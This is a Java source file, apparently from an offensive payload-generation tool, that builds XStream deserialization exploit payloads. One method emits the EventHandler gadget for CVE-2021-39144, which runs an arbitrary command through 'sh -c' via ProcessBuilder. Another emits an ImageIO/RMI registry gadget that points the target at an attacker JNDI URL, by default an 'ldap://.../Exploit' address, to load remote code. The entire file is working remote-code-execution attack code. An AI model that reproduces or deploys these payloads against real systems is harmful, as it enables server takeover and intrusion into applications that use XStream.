package com.oobx.chains;

import org.springframework.stereotype.Component;

import java.util.Map;

/**
 * XStream deserialization exploit chains.
 *
 * EventHandler gadget (CVE-2021-39144): triggers ProcessBuilder.start() via dynamic proxy.
 * Generates XML payload — no XStream library needed at generation time.
 */
@Component
public class XStreamChainHandler implements ChainHandler {

    @Override
    public PayloadResult generate(String chainId, Map<String, Object> params) throws Exception {
        String cmd     = (String) params.getOrDefault("cmd", "id");
        String jndiUrl = (String) params.getOrDefault("jndi_url", "ldap://127.0.0.1:1389/Exploit");

        String xml;
        switch (chainId) {
            case "jchains_xstream":
            case "xstream_eventhandler":
                xml = eventHandlerXml(cmd);
                break;
            case "xstream_imageio":
                xml = imageIoXml(jndiUrl);
                break;
            default:
                throw new IllegalArgumentException("Unknown XStream chain: " + chainId);
        }

        return new PayloadResult("application/xml", xml.getBytes(),
            Map.of("cmd", cmd, "source", "XStream/" + chainId));
    }

    private String eventHandlerXml(String cmd) {
        // Wrap in sh -c to allow any command string without splitting on spaces
        String escapedCmd = xmlEsc(cmd);
        return "<sorted-set>\n"
            + "  <string>foo</string>\n"
            + "  <dynamic-proxy>\n"
            + "    <interface>java.lang.Comparable</interface>\n"
            + "    <handler class=\"java.beans.EventHandler\">\n"
            + "      <target class=\"java.lang.ProcessBuilder\">\n"
            + "        <command>\n"
            + "          <string>sh</string>\n"
            + "          <string>-c</string>\n"
            + "          <string>" + escapedCmd + "</string>\n"
            + "        </command>\n"
            + "      </target>\n"
            + "      <action>start</action>\n"
            + "    </handler>\n"
            + "  </dynamic-proxy>\n"
            + "</sorted-set>\n";
    }

    private String imageIoXml(String jndiUrl) {
        return "<javax.imageio.ImageIO_-CacheInfo serialization=\"custom\">\n"
            + "  <unserializable-parents/>\n"
            + "  <javax.imageio.ImageIO_-CacheInfo>\n"
            + "    <default>\n"
            + "      <useCache>false</useCache>\n"
            + "      <cacheDirectory class=\"com.sun.jndi.rmi.registry.RegistryContext\">\n"
            + "        <rmiURLs class=\"array\" of=\"java.net.URL\">\n"
            + "          <java.net.URL>\n"
            + "            <url>" + xmlEsc(jndiUrl) + "</url>\n"
            + "          </java.net.URL>\n"
            + "        </rmiURLs>\n"
            + "      </cacheDirectory>\n"
            + "    </default>\n"
            + "  </javax.imageio.ImageIO_-CacheInfo>\n"
            + "</javax.imageio.ImageIO_-CacheInfo>\n";
    }

    private static String xmlEsc(String s) {
        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
                .replace("\"", "&quot;").replace("'", "&apos;");
    }
}
